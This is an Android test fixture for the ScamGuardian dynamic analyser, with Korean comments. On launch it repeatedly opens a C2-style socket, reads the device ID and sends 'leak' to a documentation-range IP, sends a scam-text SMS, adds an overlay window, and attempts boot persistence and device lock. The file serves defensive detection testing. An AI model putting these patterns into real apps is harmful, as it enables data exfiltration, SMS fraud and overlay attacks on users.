package com.scamguardian.dyntest;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.IntentFilter;
import android.graphics.PixelFormat;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * ⚠️ 동적 분석 검증용 ACTIVE 픽스처. 무해(RFC 5737 비라우팅 + SIM 없는 redroid).
 *
 * onCreate → 백그라운드 스레드에서 5개 행동을 실제 실행한다. 각 행동은 ScamGuardian
 * Frida 후킹(apk_dynamic_server/frida_hooks.js)의 런타임 flag 하나씩에 대응한다:
 *   1) C2 소켓        → apk_runtime_c2_network_call (IP 직접 + 비표준 포트 + test_c2 대역)
 *   2) 식별자→유출    → apk_runtime_credential_exfiltration (taint: getDeviceId → 송신)
 *   3) SMS 자동 발송   → apk_runtime_sms_intercepted
 *   4) 오버레이        → apk_runtime_overlay_attack (TYPE_APPLICATION_OVERLAY)
 *   5) persistence    → apk_runtime_persistence_install (DeviceAdmin.lockNow + BOOT_COMPLETED 등록)
 *
 * 후킹은 *메서드 진입 시점*에 발사되므로, 권한 부족/네트워크 실패로 행동이 throw 돼도
 * 검출은 성립한다 (try/catch 로 앱이 죽지 않게만 함).
 *
 * 구현 메모: 익명/람다 클래스는 JDK21 javac + d8(build-tools34) 조합에서 desugaring NPE
 * 를 유발 → named nested 클래스만 사용한다.
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new Worker(this).start();
    }

    /** 백그라운드 행동 실행 스레드. */
    static final class Worker extends Thread {
        private final MainActivity act;
        Worker(MainActivity a) { this.act = a; }
        @Override public void run() { act.runBehaviors(); }
    }

    /**
     * 행동을 *반복* 실행한다. 분석기가 spawn(처음부터 후킹) 대신 launch+attach(onCreate 이후
     * 늦게 붙음) fallback 을 쓰더라도, 매 iteration 의 행동을 놓치지 않게 하기 위함.
     * 7회 × 1.5s ≈ 10.5s — 분석기 collect 윈도우(기본 12s) 안.
     */
    void runBehaviors() {
        for (int i = 0; i < 7; i++) {
            sleep(1500);
            doC2();
            doExfil();
            doSms();
            doOverlay();
            doPersistence();
        }
    }

    // 1) C2: IP 직접 + 비표준 포트 8888 + RFC5737 비라우팅
    private void doC2() {
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress("203.0.113.7", 8888), 1500);
            s.close();
        } catch (Exception ignored) {}
    }

    // 2) 자격증명 유출: 식별자 읽기(taint source) → 별도 소켓 송신(sink)
    private void doExfil() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            tm.getDeviceId(); // 후킹이 진입 시점에 sensitiveRead=true 설정 (반환값 미사용)
        } catch (Exception ignored) {}
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress("198.51.100.9", 443), 1500);
            OutputStream os = s.getOutputStream();
            os.write("leak".getBytes());
            os.close();
            s.close();
        } catch (Exception ignored) {}
    }

    // 3) SMS 자동 발송 (더미 번호, SIM 없어 실제 발송 0)
    private void doSms() {
        try {
            SmsManager.getDefault().sendTextMessage(
                "01000000000", null, "금융감독원 안전계좌 즉시 이체", null, null);
        } catch (Exception ignored) {}
    }

    // 4) 오버레이 (TYPE_APPLICATION_OVERLAY). 후킹은 addView 진입 시점에 발사되므로
    //    UI 스레드 우회 없이 워커에서 직접 호출 — CalledFromWrongThread 등으로 throw 돼도
    //    hook 은 그 전에 잡힌다 (appop/스레드 성공 여부와 무관하게 검출 성립).
    private void doOverlay() {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
            // view 생성(비-UI 스레드에서 throw 위험) 없이 직접 호출 — 후킹은 addView 진입 시
            // 발사되므로 null view 로 내부서 NPE 가 나도 검출은 성립한다.
            wm.addView(null, lp);
        } catch (Exception ignored) {}
    }

    // 5) persistence: BOOT_COMPLETED receiver 등록 + DeviceAdmin lockNow 시도
    private void doPersistence() {
        try {
            registerReceiver(new BootReceiver(), new IntentFilter("android.intent.action.BOOT_COMPLETED"));
        } catch (Exception ignored) {}
        try {
            DevicePolicyManager dpm =
                (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            dpm.lockNow();
        } catch (Exception ignored) {}
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
